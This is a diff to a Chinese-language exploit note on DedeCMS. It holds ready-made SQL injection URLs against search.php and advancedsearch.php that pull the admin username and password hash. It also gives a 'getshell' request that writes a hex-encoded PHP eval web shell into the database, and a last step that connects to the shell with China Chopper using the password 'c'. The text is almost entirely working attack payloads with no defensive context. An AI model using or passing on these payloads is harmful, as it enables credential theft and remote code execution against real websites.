@@ -19,3 +19,21 @@ http://www.nxadmin.com/plus/search.php?keyword=as&typeArr[ uNion ]=a
 
 则利用以下exp:http://www.nxadmin.com/plus/search.php?keyword=as&typeArr[111%3D@`\’`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a
 +from+information_schema.tables+group+by+a)b)%23@`\’`+]=a
+
+-----------------------------------------------------------------------------
+
+条件利用：
+
+1.漏洞代码在/plus/advancedsearch.php 文件中
+2.php.ini要开启session.auto_start = 1
+3.必须知道一个存在的mid，需要后台有添加自定义搜索模型
+
+爆账号密码poc：
+
+http://localhost/dedecms/plus/advancedsearch.php?mid=1&_SESSION[123]=select concat(0x7c,userid,0x7c,pwd,0x7c) as aid from `%23@__admin` aaa &sqlhash=123
+
+getshell poc:
+
+http://localhost/dedecms/plus/advancedsearch.php?mid=6&_SESSION[123]=update `%23@__mytag` set normbody=0x3C3F706870206576616C28245F504F53545B635D293B3F3E where aid=1 limit 1&sqlhash=123
+
+然后菜刀链接http://localhost/dedecms/plus/mytag_js.php?aid=1 密码:c
